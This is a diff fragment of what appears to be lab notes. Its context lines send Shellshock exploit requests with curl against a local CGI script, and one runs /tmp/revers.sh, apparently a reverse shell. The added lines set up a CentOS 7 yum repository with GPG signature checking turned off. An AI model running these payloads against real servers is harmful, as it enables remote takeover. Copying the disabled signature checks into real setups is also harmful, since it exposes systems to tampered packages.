@@ -5,3 +5,11 @@ curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /usr/bin/chmod +x /
 
 curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /tmp/revers.sh" localhost:5566/cgi-bin/app.cgi
 
+
+yum-config-manager --add-repo="http://mirror.centos.org/centos/7/os/x86_64/" --nogpgcheck
+
+echo "gpgcheck=0" >> mirror.centos.org_centos_7_os_x86_64_.repo
+
+~                                                                               
+~                                                                               
+
